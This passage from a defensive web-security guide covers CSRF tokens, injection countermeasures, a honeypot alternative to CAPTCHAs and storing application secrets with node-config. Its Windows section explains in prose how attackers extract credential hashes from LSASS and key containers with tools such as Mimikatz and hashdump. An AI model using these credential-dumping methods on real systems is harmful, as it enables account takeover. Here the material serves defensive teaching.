CSRF syncroniser/challenge tokens are one approach commonly used to help defend against CSRF. This approach should also be used with other techniques like Identifying the source origin by checking the Origin and Referer headers, along with other useful techniques that have been well documented in the [OWASP CSRF Prevention Cheat Sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet). Also the [OWASP CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)) page has links to many useful resources. Also, check the [Additional Resources](#additional-resources-countermeasures-for-csrf) chapter.

With the CSRF syncroniser/challenge token pattern, a token (often called the CSRF syncroniser/challenge token) is sent as part of a response to a legitimate request from a client browser. The application on the client side holds this syncroniser/challenge token and sends it on subsequent requests to the legitimate website.

The specific server side web application is responsible for generating a unique token per session and adding it to the responses. The application in the browser, or users device, is responsible for storing the syncroniser/challenge token, then issuing it with each request where CSRF is a concern.  

When an attacker tricks a target into issuing a fraudulent request to the same website, the request has no knowledge of the syncroniser/challenge token, so it is not sent.

The legitimate website will only regard a request as being legitimate if the request also carries the valid matching syncroniser/challenge token as it is contained in the targets session on the server.

For the examples from the [Identify Risks](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-csrf) section:

The NodeGoat application deals with CSRF attacks by using an Express CSRF middleware named `_csrf` which should be added to all requests that mutate state such as discussed in the Identify Risks section. You can see this on line 67 of the [profile.html snippet](#profile_html) in the Identify Risks section within a hidden field. Repeated below:

{linenos=off, lang=html}
    <input type="hidden" name="_csrf" value="{{csrftoken}}" />

When the form is submitted, the middleware checks for existence of the token, and validates it by matching to the generated token in the targets session. If the CSRF syncroniser/challenge token fails validation, the server rejects the requested action.

To enable this CSRF middleware, simply uncomment the CSRF fix in the NodeGoat [server.js](https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/server.js#L108) file. The CSRF middleware is initialised immediately after the applications session middleware is initialised, 

{linenos=off, lang=JavaScript}
    var csrf = require("csurf");
    
    // Enable Express csrf protection.
    app.use(csrf());
    
    app.use(function(req, res, next) {
       // Expose the csrfToken to the view.
       res.locals.csrftoken = req.csrfToken(); 
       next(); 
    }); 

You can experiment with all this at [https://nodegoat.herokuapp.com/tutorial/](https://nodegoat.herokuapp.com/tutorial/a8)

Check the "[Securing Sessions](#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-securing-sessions)" countermeasures section, along with the "[Lack of Authentication, Authorisation and Session Management](#web-applications-risks-that-solution-causes-lack-of-authentication-authorisation-and-session-management)" Risks that Solution Causes section for pertinent information. 

Other techniques such as requiring the user to reauthenticate, or providing [CAPTCHA](#web-applications-countermeasures-captcha)'s are often used, although I am not a fan of such techniques. I fail to see why we as developers should make our problems the user's. We need to make sure we make it hard enough for the attackers that the enduser is not affected.

As an enduser, make sure you invalidate your authentication by logging out or deleting your session cookies when you finish working with a website that requires authentication, or leave the browser, which will then be unable to send authentication as part of a CSRF attack.

### [Injection](https://www.owasp.org/index.php/Top_10_2017-A1-Injection) {#web-applications-countermeasures-injection}
![](images/ThreatTags/PreventionEASY.png)

Usually the most effective technique for determining if/where your application is vulnerable to injection attacks is to review your code for all calls out to external resources, including interpreters, and determine whether the data you are passing is untrusted.

If you can avoid external interpreters altogether, then they can no longer be tricked into executing untrusted data, whether directly or indirectly from untrusted actors, or even stored.

Use a parametrised API for the specific technology you are working with, whether it be SQL, NoSQL, execution of Operating System commands, XML, XPath, XSLT, XQuery, LDAP, etc. 

Similar to the [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation) section, validation, filtering, sanitisation, and [constraining](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-other-things-to-think-about) all untrusted data to well structured semantic types is also necessary. Granularly isolating and semantically typing each piece of untrusted data from the command or query allows you to tightly define constraints on what you expect each specific piece of data to conform too.

Keep the principle of [least privilege](#web-applications-countermeasures-management-of-application-secrets-least-privilege) in mind during implementation. When any attacks are successful, how much damage can they currently do? Enforcing the least amount of privileges possible for the given operation minimises the possible risk.

Make sure the feedback and error messages that are provided on invalid input only provide the necessary detail that the user needs in order to provide correct input. Don't provide unnecessary details on internal workings: exceptions, stack traces, etc. Make sure you capture and handle internal errors in software, rather than letting them bubble up to the user interface.

#### SQLi {#web-applications-countermeasures-sqli}

There are a few options here:

* Use prepared statements and/or parameterised queries with bind variables to take untrusted data if you have to deal with dynamic queries. Using bind variables not only helps diffuse SQL injection, but also improve performance by [20 to 30 percent](https://www.ibm.com/developerworks/library/se-bindvariables/) in allowing the same execution plan to be used even though the arguments supplied may be different.
* Consider using parameterised Stored Procedures, but also review the code within to ensure that the parameters are being handled with semantic typing at a minimum. Concatenating parameters and the use of `exec()` within stored procedures can be prone to SQLi exploitation
* Read up on the [OWASP SQLi Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)
* Before doing any of the above, make sure you have the generic input [Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic) that we have already covered so all user input is validated, filtered, and sanitised, both the client and server side, before it gets anywhere near your queries
* ORMs, such as Hibernate with its Query Language (HQL), are not safe unless you use named parameters

There are plenty of resources that are easy to find and understand on the Internet for SQLi mitigations and countermeasures which are generally very easy to implement.

#### NoSQLi {#web-applications-countermeasures-nosqli}

Take the advice from the generic [Injection](#web-applications-countermeasures-injection) section.

For any dynamic queries, rather than piecing together strings with unvalidated user input, use prepared statements with strongly defined semantic types allowing you to use as short as possible white list of allowed characters. Then follow up with filtering and sanitisation of any characters that must be allowed through.

Queries can be formatted in many different types of conventions, depending on the type of NoSQL data store, such as [XML, JSON, LINQ, etc](https://www.owasp.org/index.php/Testing_for_NoSQL_injection#Summary). As well as these execution contexts, there will also be the execution contexts of the application itself before the untrusted data reaches the particular type of NoSQL data store API. This means, as discussed in the "[What is Sanitisation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation)" section on the Lack of Input Validation, Filtering, and Sanitisation section of Identify Risks, you must validate, filter, and sanitise based on **all** of the execution contexts that the untrusted data may pass through. With NoSQL this is usually far more tedious.

Countermeasures will need to be carefully thought about once the type of NoSQL data store syntax, data model, and programming language(s) used throughout the application are thoroughly understood.

Ideally, the NoSQL client library you decide to use will provide the logic to perform validation on characters that are potentially dangerous in the execution context of the NoSQL library. It may also provide some filtering, but you will often have to provide some configuration to help it know what you want. The NoSQL client library should also provide sanitisation for its own execution context. As discussed above, you will still need to define your own semantic types, whitelists for the semantic types, filtering, and sanitisation for your application-specific execution contexts that the NoSQL client library has no knowledge of. 

In regards to **MongoDB** (one of the 225 + types of NoSQL data stores):

Server-side execution of JavaScript can be disabled by passing the `--noscripting` option on the command line or setting [`security.javascriptEnabled`](https://docs.mongodb.com/manual/reference/configuration-options/#security.javascriptEnabled) to `false` in the configuration file, which stops you executing legitimate JavaScript operations. These are not defaults, so you must read the documentation of the type of NoSQL data store you are working with. Turning JavaScript off in this manner may be quite debilitating.

MongoDB attempts to [address injection](https://docs.mongodb.com/manual/faq/fundamentals/#how-does-mongodb-address-sql-or-query-injection) by using Binary JSON ([BSON](http://bsonspec.org/)).

Per the MongoDB [documentation](https://docs.mongodb.com/manual/faq/fundamentals/#javascript): You need to exercise care in these cases to prevent users submitting malicious JavaScript. Most queries can be expressed without JavaScript, and for those that require JavaScript, both JavaScript and non-JavaScript can be mixed into a query, placing the untrusted data into BSON fields and trusted JavaScript into the `$where` property value.

In essence, make sure you read and understand your NoSQL data store documentation before building your queries.

Looking at the MongoDB query example from the [Risks](#web-applications-identify-risks-nosqli) section, the untrusted user's password should be inserted to the query only after being processed by your Key Derivation Function ([KDF](#web-applications-countermeasures-data-store-compromise-which-kdf-to-use)). This mitigates any JavaScript being inserted into the password property. The username should only permit alphanumeric characters.

#### Command Injection {#web-applications-countermeasures-command-injection}

In addition to the points mentioned above under [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation), your greatest defence is to think through the path of where untrusted data flows, carefully considering each execution context you encounter.

Untrusted data should [never be inserted](https://blog.binarymist.net/2012/12/19/javascript-coding-standards-and-guidelines/#JavaScript-evalisEvil) to `eval`, `setTimeout`, `setInterval`, or as the last argument to `Function` without properly validating, filtering, and sanitising, if required. It is generally [not good practise](https://blog.binarymist.net/2013/07/06/javascript-object-creation-patterns/#object-creation-via-constructor) to use the `Function` constructor regardless. I have [written](https://blog.binarymist.net/2011/08/17/function-declarations-vs-function-expressions/) about this on several [occasions](https://blog.binarymist.net/2014/05/31/javascript-closures/#what-are-closures).

The NodeGoat Web Application also provides a very minimal [countermeasure example](https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/routes/contributions.js#L30-L32)

If you are still constrained to using ES5 and earlier, then add [`use strict`](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Strict_mode) mode to the beginning of your function bodies, MDN provides [details](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Strict_mode#Securing_JavaScript) on how it helps secure your JavaScirpt environment.

#### XML Injection {#web-applications-countermeasures-xml-injection}

First of all, as discussed in the generic [Injection](#web-applications-countermeasures-injection) section above, your application should validate, filter, and sanitise all untrusted data before incorporating it into an XML document. If you can:

1. Validate (eliminate) out as many XML metacharacters as possible, and sanitise those that must be accepted, depending on their execution contexts, as discussed in the [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation) Countermeasures section
2. Constrain untrusted data to well structured semantic types, as discussed in the [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-other-things-to-think-about) Countermeasures section

Use **local static**: Document Type Definitions (DTDs) or better, [XML Schemas](http://www.ws-attacks.org/XML_Injection#Attack_mitigation_.2F_countermeasures). This will mitigate XXE attacks.

If the XML parser you are using is vulnerable to XXE attacks by default, investigate disabling the XML parsers ability to follow all external resource inclusions, often available by flags. If the ability to disable external resource inclusion following is not available, consider using an alternative library. Failing that, make sure your untrusted data is validated, filtered, and sanitised by a secure parser before passing to the defective parser.

OWASP also has an XML External Entity (XXE) Prevention [Cheat Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet) that is quite useful.

#### XSLT Injection {#web-applications-countermeasures-xslt-injection}

All [mitigations discussed](https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf) are explored in the excellent paper by Emanuel Duss and Roland Bischofberger presented at an OWASP Switzerland meeting.

#### XPath Injection {#web-applications-countermeasures-xpath-injection}

Follow the precautions discussed in the generic [Injection](#web-applications-countermeasures-injection) countermeasures section, when handling dynamically constructed queries. A little validation of untrusted data will go a long way. For example, the username should only contain alphanumeric characters, filtering to a maximum length sometimes helps. In the case of usernames, because we have created a semantic type, it is easy to apply the white list of allowed characters to the untrusted data before inserting to your XPath query. In regards to the password, it should be the result of the untrusted user input password once processed by your Key Derivation Function ([KDF](#web-applications-countermeasures-data-store-compromise-which-kdf-to-use)), only then should it be inserted to your XPath query. 

By performing some simple validation, the attacker is no longer able to escape the quotes and modify the intended logic of the query.

Try to use a language library that supports parameterised queries. If the language you code in does not have support or libraries available with a parameterised XPath interface, you will need to sanitise the untrusted data being inserted to any dynamically constructed queries. What ever type of quote you are using to delimit the untrusted input, you need to sanitise the same type of quote with the XML encoded derivative. I discussed this in the [Sanitisation using escaping](#sanitisation-using-escaping) code sample in the Types of Escaping section of Countermeasures. The OWASP [XPath Injection Defences](https://www.owasp.org/index.php/XPATH_Injection#XPath_Injection_Defenses) also goes over this.

Also, check the [Additional Resources](#additional-resources-countermeasures-for-xpath-injection) chapter for both identifying risks and countermeasures in regards to XPath injection.

#### XQuery Injection {#web-applications-countermeasures-xquery-injection}

Because XQuery is a superset of XPath with the SQL-like FLWOR expression abilities, it enjoys the same countermeasures as XPath and SQLi.

#### LDAP Injection {#web-applications-countermeasures-ldap-injection}

The same [generic injection countermeasures](#web-applications-countermeasures-injection), as well as many of the more specific countermeasures that we have already discussed, are applicable to LDAP also.

As part of your validation, define your semantic types for each dynamic section, this will help you define what is accepted as the white list of allowed characters for each untrusted section. If you can constrain what is an allowable character for your given semantic types, then this, as in many cases (such as where a username is only allowed alphanumeric characters for example), will stop any potential characters being able to break out of the intended context and change the logic of the LDAP query. This is why we always put the validation -> filtering -> sanitisation in this order, because often the first step will catch everything.

For each semantic type of untrusted data, for any characters that pass the white list validation, define filters, and sanitise all of the following [validated characters](http://www.rlmueller.net/CharactersEscaped.htm):

* comma: `,`
* back slash: `\`
* forward slash (when used in Distinguished Names): `/`
* hash: `#`
* plus: `+`
* less than: `<`
* greater than: `>`
* semicolon: `;`
* double quote: `"`
* equals: `=`
* Leading or trailing spaces

with their [unicode hexidesimal](https://unicode-table.com/en/) number, such as

comma: \2C, back slash: \5C

Respect and implement the principle of [least privilege](#web-applications-countermeasures-management-of-application-secrets-least-privilege), as discussed in the generic injection countermeasures. Do not use administrative bind accounts in your execution environment, and apply the least privileges to the domain user service account.

The framework and/or libraries you use to interact with LDAP servers should sanitise untrusted data and not allow application code to directly interact with LDAP servers.

### Captcha {#web-applications-countermeasures-captcha}
![](images/ThreatTags/PreventionVERYEASY.png)

#### Types

**Text Recognition**

recaptcha uses this technique. See below for details.

**Image Recognition**

Uses images where users have to perform certain operations on, such as dragging images to another corresponding image. For example: "Please drag all cat images to the cat mat.", or "Please select all images of things that dogs eat." sweetcaptcha is an example of this type of captcha. This type completely rules out visually impaired users.

**Friend Recognition**

Pioneered by Facebook, this type of captcha focuses on human hackers, the intent being that they will not know who your friends are. 

"_Instead of showing you a traditional captcha on Facebook, one of the ways we may help verify your identity is through social authentication. We will show you a few pictures of your friends and ask you to name the person in those photos. Hackers halfway across the world might know your password, but they don't know who your friends are._"

I disagree with this statement, as a determined hacker will usually be able to find out who your friends are. This also poses another problem: do you know who all of your friends are? Every acquaintance? I am terrible with names, and so are many other people. This is supposed to be used to authenticate you, by getting you to answer the questions before you can log in.

**Logic Questions**

Textcaptcha uses simple logic questions which are designed for the intelligence of a seven year old child. These are more accessible than image and textual image recognition, but can take longer than image recognition to answer. Unless the user is visually impaired, the questions are usually language specific, targeting the English language.

**User Interaction**

This is similar to image recognition, where users have to perform actions that virtual intelligence can not work out as of yet. Users are required to drag a slider to a certain number of notches.  
As an offering becomes more popular, creating code to perform the action may not be that hard and would definitely be worth the effort for bot creators.  
This is obviously not going to work for the visually impaired, or for people with motorskills disabilities.

&nbsp;

In NPM land, as usual there are many options to choose from. The following were the offerings I evaluated. None of which really felt like a good fit:

#### Offerings

* [total-captcha](https://www.npmjs.com/package/total-captcha) depends on node-canvas. Have to install cairo first, but why? No explanation. Very little of anything here. Move on. How does this work? Do not know. What type is it? Presume text recognition.
* [easy-captcha](https://www.npmjs.com/package/easy-captcha) is a text recognition offering generating images
* [simple-captcha](https://www.npmjs.com/package/simple-captcha) looks like another text recognition offering. I really do not want to be writing image files to my server.
* [node-captcha](https://www.npmjs.com/package/node-captcha) depends on canvas. By the look of the package this is another text recognition in a generated image.
* [re-captcha](https://www.npmjs.com/package/re-captcha) was one of the first captcha offerings, created at the Carnegie Mellon University by Luis von Ahn, Ben Maurer, Colin McMillen, David Abraham and Manuel Blum who invented the term captcha. Google later acquired it in September 2009. recaptcha is a text recognition captcha that uses scanned text that optical character recognition (OCR) technology has failed to interpret, which has the added benefit of helping to digitise text for The New York Times and Google Books.  
![](images/reCaptcha.jpg)  
* [sweetcaptcha](https://www.npmjs.com/package/sweetcaptcha) uses the sweetcaptcha cloud service where you must abide by their terms and conditions, requires another node package, and requires some integration work. sweetcaptcha is an image recognition type of captcha.  
![](images/sweetcaptcha.jpg)
* [textcaptcha](http://textcaptcha.com/) is a logic question captcha relying on an external service for the questions and md5 hashes of the correct lower cased answers. This looks pretty simple to set up, but again expects your users to use their intellect for things they should not have to.

&nbsp;

After some additional research I worked out why the above types and offerings didn't feel like a good fit. It pretty much came down to user experience. Why should genuine users/customers of your web application be disadvantaged by having to jump through hoops because you have decided you want to stop bots spamming you? Would it not make more sense to make life harder for the bots rather than for your genuine users?

There are additional considerations. Ideally, I wanted a simple solution requiring few or ideally no external dependencies, no JavaScript required, no reliance on the browser or anything out of my control, no images, and it definitely should not cost any money.

#### Alternative Approaches

* Services like Disqus can be good for commenting. Obviously, all comments are stored somewhere in the cloud out of your control, which is an external dependency. For simple text input, this is probably not what you want. Similar services that use social media authentication services, can take things a bit too far I think. They remove all freedoms from your users. Why should your users be disadvantaged by leaving a comment or posting a message on your web application? Disqus tracks users activities from hosting website to website whether you have an account, are logged in or not. Any information they collect such as IP address, web browser details, installed add-ons, referring pages and exit links may be disclosed to any third party. When this data is aggregated it is useful for de-anonymising users. If users choose to block the Disqus script, the comments are not visible. Disqus has also published its registered users entire commenting histories, along with a list of connected blogs and services on publicly viewable user profile pages. Disqus also engage in add targeting and blackhat SEO techniques from the websites in which their script is installed.
* Services like Akismet and Mollom take user input and analyse for spam signatures. Mollom sometimes presents a captcha if it is unsure. These two services learn from their mistakes if they mark something as spam and you unmark it, but of course you are going to have to be watching for that. Matt Mullenweg created Akismet so that his mother could blog in safety. "_His first attempt was a JavaScript plugin which modified the comment form and hid fields, but within hours of launching it, spammers downloaded it, figured out how it worked, and bypassed it. This is a common pitfall for anti-spam plugins once they get traction_". My advice is don't use a common plugin, but to create something custom. I will discuss this soon.

The above solutions are excellent targets for exploits that will pay off due to the fact that so many websites are using them. There are exploits discovered for these services regularly.

#### Still Not Cutting it

"_Given the fact that many clients count on conversions to make money, not receiving 3.2% of those conversions could put a dent in sales.  Personally, I would rather sort through a few SPAM conversions instead of losing out on possible income._"

> Casey Henry: [Captchas' Effect on Conversion Rates](https://moz.com/blog/captchas-affect-on-conversion-rates)

"_Spam is not the user’s problem; it is the problem of the business that is providing the website. It is arrogant and lazy to try and push the problem onto a website’s visitors._"

> Tim Kadlec: [Death to Captchas](http://timkadlec.com/2011/01/death-to-captchas/)

#### User Time Expenditure

Another technique is to record how long it takes from fetch to submit, where time is specifically measured. For example, if the time span is under five seconds it is more than likely a bot, so handle the message accordingly.

#### Bot Pot

Spam bots operating against custom mechanisms will, in most cases, just try, then move on. If you decide to use one of the common offerings from above, exploits will be more common, depending on how wide spread the offering is. This is one of the cases where going custom is a better option. Worst case is that you get some spam and can modify your technique, but you can also keep things simple. It is tailored to your web application, your user's needs, no external dependencies, and no monthly fees. This is also the simplest technique and requires very little work to implement.

Spam bots:

* Love to populate form fields
* Usually ignore CSS. For example, if you have some CSS that hides a form field and especially if the CSS is not inline on the same page, they will usually fail at realising that the field is not supposed to be visible.

Create a field that is not visible to humans, and is supposed to be kept empty. On the server, once the form is submitted, check that it is still empty. If it is not, then we assume a bot has been at it.

This is so simple, doesn't get in the way of users, and is yet very effective at filtering bot spam.

Client side:

{title="CSS", linenos=off, lang=CSS}
    form .bot-pot {
       display: none;
    }

{title="HTML", linenos=off, lang=HTML}
    <form>
       <!--...-->
       <div><input type="text" name="bot-pot" class="bot-pot"></div>
       <!--...-->
    </form>

Server side:

This is also shown above in a larger example in the [Lack of Input Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-nodejs) section. I show the validation code middleware of the route on line 28 below. The validation is performed on line 14.

{title="routes/home.js", linenos=on, lang=JavaScript}
    //...
    
    function home(req, res) {
      res.redirect('/');
    }
    
    function index(req, res) {
       res.render('home', { title: 'Home', id: 'home', brand: 'your brand' });
    }
    
    function validate() {
       return form(
          // Bots love to populate everything.
          fieldToValidate('bot-pot').maxLength(0)
       );
    }
    
    function contact(req, res) {
       
       if(req.form.isValid)
          // We know the bot-pot is of zero length. So no bots.
       //...
    }
    
    module.exports = function (app) {
       app.get('/', index);
       app.get('/home', home); 
       app.post('/contact', validate(), contact);
    };

As you can see, it's a very simple solution. You could even consider combining the above two techniques.

#### Testing

Check out the "Testing for Captcha (OWASP-AT-008" in v3 of the OWASP Testing Guide for a summary and description of the issue, and for testing examples. The Offensive Web Testing Framework (OWTF) also has a [plugin](https://github.com/owtf/owtf/wiki/Listing-Plugins) for it.

### Management of Application Secrets {#web-applications-countermeasures-management-of-application-secrets}

Secure password management within applications is often a case of doing the best you can, relying on obscurity, and leaning on other layers of defence to make it harder for compromise as already discussed in the previous chapters. Review the [Storage of Secrets](#cloud-countermeasures-storage-of-secrets) subsections in the Cloud chapter for some ideas and tooling options to help with this.

Find out how much secrecy is required for the data that is being sent over the network. Consider your internal network just as malicious as the internet. Then you will be starting to get the idea of what defence in depth is all about. When one defence breaks down, you may still be in good standing.

![](images/DefenceInDepth.png)

You may have read that having datastore passwords and other types of secrets in configuration files in clear text is an insecurity that [must be addressed](https://www.owasp.org/index.php/Password_Plaintext_Storage). When it comes to mitigation, there are techniques that can help, but most of them are based around obscuring the secret rather than securing it. Essentially, this is usually akin to making discovery a little more inconvenient such as using an alternate port for SSH other than the default of 22. Surprisingly though, obscurity does significantly reduce the number of opportunistic types of attack from bots and script kiddies.

#### Store Configuration in Configuration files {#web-applications-countermeasures-management-of-application-secrets-store-configuration}
![](images/ThreatTags/PreventionAVERAGE.png)

Do not hardcode passwords in source files for all developers to see. Doing so also means the code has to be patched when services are breached. At the very least, store them in configuration files and use different configuration files for different deployments and consider keeping them out of source control.

Here are some examples using the node-config module.

##### node-config

node-config is a fully featured, well maintained configuration package that I have used on a good number of projects.

To install: From the command line within the root directory of your NodeJS application, run:

`npm install node-config --save`

Now you are ready to start using node-config. An example of the relevant section of an `app.js` file may look like the following:

{title="app.js", linenos=off, lang=JavaScript}
    // Due to bug in node-config the if statement is required before config is required
    // https://github.com/lorenwest/node-config/issues/202
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');


Where ever you use node-config, in your routes for example:

{title="home.js", linenos=off, lang=JavaScript}
    var config = require('config');
    var nodemailer = require('nodemailer');
    var enquiriesEmail = config.enquiries.email;
    
    // Setting up email transport.
    var transporter = nodemailer.createTransport({
       service: config.enquiries.service,
       auth: {
          user: config.enquiries.user,
          pass: config.enquiries.pass // App specific password.
       }
    });


A good collection of different formats can be used for the config files: `.json`, `.json5`, `.hjson`, `.yaml`, `.js`, `.coffee`, `.cson`, `.properties`, `.toml`

There is a specific [file loading order](https://github.com/lorenwest/node-config/wiki/Configuration-Files) which you specify by file naming convention, which provides a lot of flexibility and which caters to:

* Multiple instances of the same application running on the same machine
* The use of short and full host names to mitigate machine naming collisions
* The type of deployment. This can be anything you set the `$NODE_ENV` environment variable to for example: `development`, `production`, `staging`, `whatever`.
* Using and creating config files which stay out of source control. These config files have a prefix of `local`. These files are to be managed by external configuration management tools, build scripts, etc. thus providing even more flexibility about where your sensitive configuration values come from.

{pagebreak}

The config files for the required attributes used above may take the following directory structure:

{title="Directory layout", linenos=off, lang=JavaScript}
    OurApp/
    |
    +-- config/
    |  |
    |  +-- default.js (usually has the most in it)
    |  |
    |  +-- devbox1-development.js
    |  |
    |  +-- devbox2-development.js
    |  |
    |  +-- stagingbox-staging.js
    |  |
    |  +-- prodbox-production.js
    |  |
    |  +-- local.js (creted by build)
    |
    +-- routes
    |  |
    |  +-- home.js
    |  |
    |  +-- ...
    |
    +-- clients
    |  |
    |  +-- ...
    |
    +-- app.js (entry point)
    |
    +-- ...


The contents of the above example configuration files may look like the following:

{title="default.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Supported services:
          // https://github.com/andris9/nodemailer-wellknown#supported-services
          // supported-services actually use the best security settings by default.
          // I tested this with a wire capture, because it is always the most fool proof way.
          service: 'FastMail',
          email: 'yourusername@fastmail.com',
          user: 'yourusername',
          pass: null
       }
       // Lots of other settings.
       // ...
    }

{title="devbox1-development.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Test password for developer on devbox1
          pass: 'D[6F9,4fM6?%2ULnirPVTk#Q*7Z+5n' // App specific password.
       }
    }

{title="devbox2-development.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Test password for developer on devbox2
          pass: 'eUoxK=S9<,`@m0T1=^(EZ#61^5H;.H' // App specific password.
       }
    }

{title="stagingbox-staging.js", linenos=off, lang=JavaScript}
    {}

{title="prodbox-production.js", linenos=off, lang=JavaScript}
    {}

{title="local.js", linenos=off, lang=JavaScript}
    // Build creates this file.
    module.exports = {
       enquiries: {
          // Password created by the build.
          pass: '10lQu$4YC&x~)}lUF>3pm]Tk>@+{N]' // App specific password.
       }
    }

The [Logging](#web-applications-countermeasures-lack-of-visibility-insufficient-logging) section shows more configuration options to provide a slightly bigger picture.

node-config also:

* Provides command line overrides, thus allowing you to override configuration values at application start from command
* Allows for the overriding of environment variables with [custom environment variables](https://github.com/lorenwest/node-config/wiki/Environment-Variables#custom-environment-variables) from a `custom-environment-variables.json` file

&nbsp;

Encrypting/decrypting credentials in code may provide some obscurity, but not much more than that.  
There are different answers for different platforms, none of which provide complete security, if there is such a thing, but instead focusing on different levels of obscurity.

##### Windows  {#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows}

**Store database credentials as a Local Security Authority (LSA) secret** and create a DSN with the stored credential. Use a SqlServer [connection string](https://www.owasp.org/index.php/Configuration#Secure_connection_strings) with `Trusted_Connection=yes`

The hashed credentials are stored in the SAM file and the registry. If an attacker has physical access to the storage, they can easily copy the hashes if the machine is not running or can be shut down. The hashes can be sniffed [from the wire](#network-identify-risks-wire-inspecting) in transit. The hashes can be pulled from the running machine's memory (specifically the Local Security Authority Subsystem Service (`LSASS.exe`)) using tools such as Mimikatz, WCE, Metasploits [hashdump](https://www.rapid7.com/db/modules/post/windows/gather/hashdump) or fgdump.

The `NTDS.dit` database file, along with the DBLayer that is running inside the NTDSAI.DLL (DSA), is directly managed by the Extensible Storage Engine (ESE), which tries to read as much as possible into `LSASS.exe` memory. 

An attacker generally only needs the hash. Trusted tools such as psexec (as we [discussed in the VPS chapter](#vps-identify-risks-windows-pth-suite-of-metasploit-modules)) take care of this for us. I also discussed this in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation. 

&nbsp;

**Encrypt sections** of web, executable, machine-level, and application-level configuration files with `aspnet_regiis.exe` with the `-pe` option, the name of the configuration element to encrypt, and the configuration provider you want to use. `DataProtectionConfigurationProvider` (uses DPAPI) or `RSAProtectedConfigurationProvider` (uses RSA) and the `-pd` switch is used to decrypt or programatically:  
`string connStr = ConfigurationManager.ConnectionString["MyDbConn1"].ToString();`

There is also a problem with this, as DPAPI uses LSASS, whereby, an attacker can extract the hash from its memory. If the `RSAProtectedConfigurationProvider` has been used, a key container is required. Mimikatz will force an export from the key container to a `.pvk` file, which can then be [read](http://stackoverflow.com/questions/7332722/export-snk-from-non-exportable-key-container) using OpenSSL or tools from the `Mono.Security` assembly.

&nbsp;

I have explored other methods using `PSCredential` and `SecureString` which also rely on DPAPI and thus LSASS, which is open for exploitation.

&nbsp;

[**Credential Guard**](https://technet.microsoft.com/en-us/library/mt483740) and Device Guard leverage virtualisation-based security, but by the look of it are still using LSASS. Bromium have partnered with Microsoft and have coined it Micro-virtualization. The idea is that every user task is isolated into its own micro-VM. There seems to be some confusion as to how this is any better. Tasks still need to communicate outside of their VM, so what is to stop malicious code doing the same? I have seen lots of questions about this, but no compelling answers yet. Credential Guard must run on physical hardware directly. You can not run it on virtual machines. This alone rules out many deployments.

"_Bromium vSentry transforms information and infrastructure protection with a revolutionary new architecture that isolates and defeats advanced threats targeting the endpoint through web, email and documents_"

"_vSentry protects desktops without requiring patches or updates, defeating and
automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"

This is marketing talk. Please don't take this literally.

"_vSentry empowers users to access whatever information they need from any network, application or website, without risk to the enterprise_"

"_Traditional security solutions rely on detection and often fail to block targeted attacks which use unknown “zero day” exploits. Bromium uses hardware enforced isolation to stop even “undetectable” attacks without disrupting the user._"

> Bromium

"_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"

> Bromium

These seem like bold claims.

Also consider that Microsoft's new virtualization-based security also relies on UEFI Secure Boot, which has been proven [insecure](http://www.itworld.com/article/2707547/endpoint-protection/researchers-demo-exploits-that-bypass-windows-8-secure-boot.html).

##### Linux

**Containers** help to provide some form of isolation which allows you to only have the user accounts do what is necessary for the application.

I usually use a **deployment tool that also changes the permissions** and ownership of the files involved with the running web application to a single system user, so unprivileged users can not access the web applications files at all. The [deployment script](https://github.com/binarymist/DeploymentTool) is executed over SSH in a remote shell, enabling only specific commands on the server to run, and a very limited set of users have access to the machine. If you are using Linux or Docker Containers then you can reduce these vectors even more if you haven't already.

One of the appeals of GNU/Linux is that you can choose as much or little security as you desire. No one has made that decision for you already and locked you out of the source. GNU/Linux is a beloved secret that requires no marketing hype and it provides complete control if you so choose. If you do not know what you want, then someone else will probably take that control from you. It is just a matter of time if it hasn't happened already.

#### Least Privilege {#web-applications-countermeasures-management-of-application-secrets-least-privilege}
![](images/ThreatTags/PreventionEASY.png)

An application should have the least privilege necessary in order to carry out what it needs to do. Consider creating accounts for each trust distinction. For example, where you only need to read from a data store, create that connection with a user's credentials that is only allowed to read, and do the same for other privileges. This way the attack surface is minimised. Adhering to the principle of least privilege, also consider removing table access completely from the application, and only provide permissions to the application to run stored queries. That way, if/when an attacker is able to compromise the machine, and retrieve the password for an action on the datastore, they will not be able to do much with it.

#### Location
![](images/ThreatTags/PreventionEASY.png)

Put your services such as datastores on network segments that are as [sheltered](#network-countermeasures-lack-of-segmentation) as possible, and only contain similar services.

